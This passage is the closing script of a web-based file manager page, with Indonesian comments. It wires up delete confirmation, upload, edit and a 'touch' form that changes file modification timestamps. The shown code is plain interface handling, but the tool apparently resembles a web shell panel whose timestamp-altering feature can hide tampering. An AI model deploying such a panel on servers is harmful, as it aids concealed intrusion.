    currentAction = 'delete';
    document.getElementById('confirmMessage').textContent = 
        'Are you sure you want to delete "' + deletePath + '"?';
    document.getElementById('confirmModal').style.display = 'block';
}

// Event listener untuk tombol Yes pada modal konfirmasi
document.getElementById('confirmYes').onclick = function() {
    if (currentFormId) {
        const form = document.getElementById(currentFormId);
        if (form) {
            form.submit();
        }
    }
    document.getElementById('confirmModal').style.display = 'none';
};

// Event listener untuk tombol No pada modal konfirmasi
document.getElementById('confirmNo').onclick = function() {
    document.getElementById('confirmModal').style.display = 'none';
};

function updateFileName(input) {
    if (input.files && input.files[0]) {
        var fileName = input.files[0].name;
        document.getElementById('fileLabel').textContent = fileName;
    } else {
        document.getElementById('fileLabel').textContent = 'Choose file...';
    }
}

document.addEventListener('DOMContentLoaded', function() {
    // Setup MutationObserver untuk memantau perubahan pada form touch
    const touchFormContainer = document.getElementById('touchFormContainer');
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
                const displayValue = touchFormContainer.style.display;
                if (displayValue === 'block') {
                    // Form touch baru saja ditampilkan, scroll ke atas
                    setTimeout(scrollToTop, 50);
                }
            }
        });
    });
    
    // Mulai memantau perubahan atribut style pada form touch
    observer.observe(touchFormContainer, { attributes: true });
    
    // Tangani semua tombol Touch di seluruh halaman (kolom Dimodifikasi)
    const allTouchButtons = document.querySelectorAll('.clickable-date');
    allTouchButtons.forEach(element => {
        // Simpan nilai onclick asli
        const originalOnclick = element.getAttribute('onclick');
        
        if (originalOnclick && originalOnclick.includes('showTouchForm')) {
            // Ekstrak parameter dari onclick
            const matches = originalOnclick.match(/'([^']+)'/g);
            if (matches && matches.length >= 2) {
                const filePath = matches[0].replace(/'/g, '');
                const timestamp = matches[1].replace(/'/g, '');
                
                // Hapus onclick asli
                element.removeAttribute('onclick');
                
                // Tambahkan event listener baru
                element.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    
                    // Panggil fungsi showTouchForm yang sudah di-override
                    window.showTouchForm(filePath, timestamp);
                }, true); // Use capture phase
            }
        }
    });
    
    // Tangani semua tombol Edit di View File Section
    const editButtons = document.querySelectorAll('#viewFileSection button[onclick^="showEditForm"]');
    editButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const filePath = this.getAttribute('onclick').match(/'([^']+)'/)[1];
            showEditForm(filePath);
        });
    });
    
    // Tangani semua tombol Touch di View File Section
    const touchButtons = document.querySelectorAll('#viewFileSection button[onclick^="showTouchForm"]');
    touchButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const onclickText = this.getAttribute('onclick');
            const matches = onclickText.match(/'([^']+)'/g);
            if (matches && matches.length >= 2) {
                const filePath = matches[0].replace(/'/g, '');
                const timestamp = matches[1].replace(/'/g, '');
                showTouchForm(filePath, timestamp);
            }
        });
    });
    
    // Tangani tombol Touch di dalam form Edit
    const editFormTouchButtons = document.querySelectorAll('#editFormContainer button[onclick^="showTouchForm"]');
    editFormTouchButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const onclickText = this.getAttribute('onclick');
            const matches = onclickText.match(/'([^']+)'/g);
            if (matches && matches.length >= 2) {
                const filePath = matches[0].replace(/'/g, '');
                const timestamp = matches[1].replace(/'/g, '');
                showTouchForm(filePath, timestamp);
            }
        });
    });
});
</script>

</body>
</html>